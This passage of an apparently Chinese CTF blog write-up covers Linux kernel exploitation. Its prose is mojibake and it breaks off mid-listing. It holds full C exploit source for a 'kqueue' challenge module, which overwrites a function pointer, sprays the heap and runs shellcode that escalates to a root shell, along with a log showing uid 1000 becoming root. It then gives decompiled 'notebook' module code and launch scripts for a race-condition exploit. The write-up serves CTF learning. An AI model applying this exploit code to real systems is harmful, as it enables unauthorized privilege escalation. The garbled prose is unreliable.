class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell pk&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> max_entries;</span><br><span class="line">    <span class="keyword">uint16_t</span> data_size;</span><br><span class="line">    <span class="keyword">uint16_t</span> entry_idx;</span><br><span class="line">    <span class="keyword">uint16_t</span> queue_idx;</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">&#125;<span class="keyword">request_t</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint32_t</span> max_entries,<span class="keyword">uint16_t</span> data_size)</span></span>&#123;</span><br><span class="line">    <span class="keyword">request_t</span> request=&#123;</span><br><span class="line">        .max_entries=max_entries,</span><br><span class="line">        .data_size=data_size</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0xDEADC0DE</span>,&amp;request);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint16_t</span> queue_idx,<span class="keyword">uint16_t</span> entry_idx,<span class="keyword">char</span>* data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">request_t</span> request=&#123;</span><br><span class="line">        .data=data,</span><br><span class="line">        .entry_idx=entry_idx,</span><br><span class="line">        .queue_idx=queue_idx</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0xDAADEEEE</span>,&amp;request);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint16_t</span> queue_idx,<span class="keyword">uint32_t</span> max_entries,<span class="keyword">uint16_t</span> data_size)</span></span>&#123;</span><br><span class="line">    <span class="keyword">request_t</span> request=&#123;</span><br><span class="line">        .max_entries=max_entries,</span><br><span class="line">        .data_size=data_size,</span><br><span class="line">        .queue_idx=queue_idx</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0xB105BABE</span>,&amp;request);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> getshell=(<span class="keyword">size_t</span>)usr_shell;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shellcode</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r12, qword ptr [rsp+0x8];&quot;</span></span><br><span class="line">        <span class="string">&quot;sub r12, 0x201179;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;add r12, 0x8c140;&quot;</span></span><br><span class="line">        <span class="string">&quot;add r13, 0x8c580;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, 0;&quot;</span></span><br><span class="line">        <span class="string">&quot;call r13;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi ,rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;call r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, getshell;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> seq_fd[<span class="number">0x200</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">heap_spray</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x200</span>;i++)&#123;</span><br><span class="line">        seq_fd[i]=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(!seq_fd[i])&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;/proc/self/stat open fail&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,(<span class="keyword">size_t</span>)shellcode);</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;/dev/kqueue&quot;</span>,O_RDONLY);</span><br><span class="line">    create(fd,<span class="number">0xffffffff</span>,<span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">size_t</span> data[<span class="number">5</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,(<span class="keyword">size_t</span>)shellcode&#125;;</span><br><span class="line">    edit(fd,<span class="number">0</span>,<span class="number">0</span>,(<span class="keyword">char</span>*)data);</span><br><span class="line">    heap_spray();</span><br><span class="line">    save(fd,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x200</span>;i++)&#123;</span><br><span class="line">        read(seq_fd[i],data,<span class="number">0x20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/ $ id</span><br><span class="line">uid=1000(pwn) gid=1000 groups=1000</span><br><span class="line">/ $ ./exp</span><br><span class="line">[*] Status has been saved.</span><br><span class="line">0x400b9a</span><br><span class="line">[    8.958689] [-] kqueue data size exceed</span><br><span class="line">[    8.973254] [-] Invalid entry count</span><br><span class="line">[    8.973640] [-] Entry size <span class="built_in">limit</span> exceed</span><br><span class="line">getshelling</span><br><span class="line">[*]----getshell pk</span><br><span class="line">/ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0</span><br></pre></td></tr></table></figure>

<h2 id="heap-spray"><a href="#heap-spray" class="headerlink" title="heap spray"></a>heap spray</h2><p>å†…æ ¸å †å–·ï¼Œä¾æˆ‘ä¹‹è§ä¸»è¦é’ˆå¯¹çš„æ˜¯UAFå’Œå †æº¢å‡ºï¼Œåˆ©ç”¨å¤§é‡çš„å †å–·æ¥å¾—åˆ°UAFæ‰€æŒ‡çš„å †æˆ–è€…ç”³è¯·åˆ°å¯ä»¥å †æº¢å‡ºçš„å †çš„ä¸‹ä¸€ä¸ªå †ï¼ŒKqueueå°±æ˜¯è¿™ä¸ªæ€è·¯ï¼Œä¸‹é¢çš„ä¾‹é¢˜notebookæ˜¯ä¸Šä¸€ä¸ªæ€è·¯ã€‚</p>
<p><strong>å¯åŠ¨è„šæœ¬</strong></p>
<p>ä»å¯åŠ¨è„šæœ¬ä¸­å¯ä»¥çœ‹è§å¼€èµ·äº†kaslr,smep,smap,ç„¶åè®¾ç½®äº†ä¸¤ä¸ªcpu,æ¯ä¸ªcpuä¸¤ä¸ªæ ¸ï¼Œæ‰€ä»¥æœ€å¤šå¯ä»¥è·‘å››ä¸ªçº¿ç¨‹ã€‚ç„¶åä»<code>/sys/devices/system/cpu/vulnerabilities/*</code>æ–‡ä»¶ä¸­å¯ä»¥çœ‹å‡ºå¼€å¯äº†KPTI.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">stty intr ^]</span><br><span class="line"><span class="built_in">exec</span> timeout 300 qemu-system-x86_64 -m 64M -kernel bzImage -initrd rootfs.cpio -append <span class="string">&quot;loglevel=3 console=ttyS0 oops=panic panic=1 kaslr&quot;</span> -nographic -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap -monitor /dev/null 2&gt;/dev/null -s</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Mitigation: __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpoline</span><br></pre></td></tr></table></figure>

<p><strong>æ–‡ä»¶ç³»ç»Ÿå¯åŠ¨è„šæœ¬</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">/bin/mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:tty /dev/console</span><br><span class="line">chown root:tty /dev/ptmx</span><br><span class="line">chown root:tty /dev/tty</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"></span><br><span class="line">ifup eth0 &gt; /dev/null 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">insmod notebook.ko</span><br><span class="line">cat /proc/modules | grep notebook &gt; /tmp/moduleaddr</span><br><span class="line">chmod 777 /tmp/moduleaddr</span><br><span class="line">chmod 777 /dev/notebook</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Welcome to QWB!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh</span></span><br><span class="line">setsid cttyhack setuidgid 0000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 1 -n -f</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜è™½ç„¶æ˜¯å †å–·ï¼Œä½†æ˜¯æœ€å…³é”®çš„è¿˜æ˜¯æ¡ä»¶ç«äº‰ï¼Œè€Œä¸”æ˜¯æˆ‘ç°åœ¨æ°´å¹³æ¥çœ‹æ˜¯æ¯”è¾ƒéš¾ä»¥å¯Ÿè§‰ä½†æ˜¯ç†è§£äº†åˆè§‰å¾—ååˆ†å‰å®³çš„åˆ©ç”¨,æ¡ä»¶ç«äº‰ä¸»è¦è¿˜æ˜¯ä½¿ç”¨<code>copy</code>å‡½æ•°ï¼Œæ¼æ´å°±å‡ºåœ¨<code>add</code>å’Œ<code>edit</code>å‡½æ•°ä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">noteedit</span><span class="params">(<span class="keyword">size_t</span> idx, <span class="keyword">size_t</span> newsize, <span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// r13</span></span><br><span class="line">  note *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// r12</span></span><br><span class="line">  __int64 v8; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(idx);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">-1LL</span>;</span><br><span class="line">    printk(<span class="string">&quot;[x] Edit idx out of range.\n&quot;</span>, newsize);</span><br><span class="line">    <span class="keyword">return</span> v8;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = v3;</span><br><span class="line">  v5 = &amp;notebook[idx];</span><br><span class="line">  raw_read_lock(&amp;lock);</span><br><span class="line">  size = v5-&gt;size;</span><br><span class="line">  v5-&gt;size = newsize;</span><br><span class="line">  <span class="keyword">if</span> ( size == newsize )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> editout;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = (*(__int64 (__fastcall **)(<span class="keyword">void</span> *, <span class="keyword">size_t</span>, __int64))krealloc.gap0)(v5-&gt;note, newsize, <span class="number">37748928LL</span>);</span><br><span class="line">  copy_from_user(name, v4, <span class="number">0x100</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !v5-&gt;size )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;free in fact&quot;</span>);</span><br><span class="line">    v5-&gt;note = <span class="number">0LL</span>;</span><br><span class="line">    v8 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> editout;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)_virt_addr_valid(v7) )</span><br><span class="line">  &#123;</span><br><span class="line">    v5-&gt;note = (<span class="keyword">void</span> *)v7;</span><br><span class="line">    v8 = <span class="number">2LL</span>;</span><br><span class="line">editout:</span><br><span class="line">    raw_read_unlock(&amp;lock);</span><br><span class="line">    printk(<span class="string">&quot;[o] Edit success. %s edit a note.\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">return</span> v8;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(<span class="string">&quot;[x] Return ptr unvalid.\n&quot;</span>);</span><br><span class="line">  raw_read_unlock(&amp;lock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">noteadd</span><span class="params">(<span class="keyword">size_t</span> idx, <span class="keyword">size_t</span> size, <span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// r13</span></span><br><span class="line">  note *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v6; <span class="comment">// r14</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v8; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(idx, size, buf);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">-1LL</span>;</span><br><span class="line">    printk(<span class="string">&quot;[x] Add idx out of range.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v3;</span><br><span class="line">    v5 = &amp;notebook[idx];</span><br><span class="line">    raw_read_lock(&amp;lock);</span><br><span class="line">    v6 = v5-&gt;size;</span><br><span class="line">    v5-&gt;size = size;</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x60</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5-&gt;size = v6;</span><br><span class="line">      v8 = <span class="number">-2LL</span>;</span><br><span class="line">      printk(<span class="string">&quot;[x] Add size out of range.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      copy_from_user(name, v4, <span class="number">0x100</span>LL);</span><br><span class="line">      <span class="keyword">if</span> ( v5-&gt;note )</span><br><span class="line">      &#123;</span><br><span class="line">        v5-&gt;size = v6;</span><br><span class="line">        v8 = <span class="number">-3LL</span>;</span><br><span class="line">        printk(<span class="string">&quot;[x] Add idx is not empty.\n&quot;</span>, v4, v7);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v5-&gt;note = (<span class="keyword">void</span> *)_kmalloc(size, <span class="number">37748928LL</span>);</span><br><span class="line">        printk(<span class="string">&quot;[+] Add success. %s left a note.\n&quot;</span>, name);</span><br><span class="line">        v8 = <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    raw_read_unlock(&amp;lock);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="è§£æ³•ä¸€-userfaultfd-uaf-tty-struct-rop"><a href="#è§£æ³•ä¸€-userfaultfd-uaf-tty-struct-rop" class="headerlink" title="è§£æ³•ä¸€:userfaultfd+uaf+tty_struct+rop"></a><strong>è§£æ³•ä¸€</strong>:userfaultfd+uaf+tty_struct+rop</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span 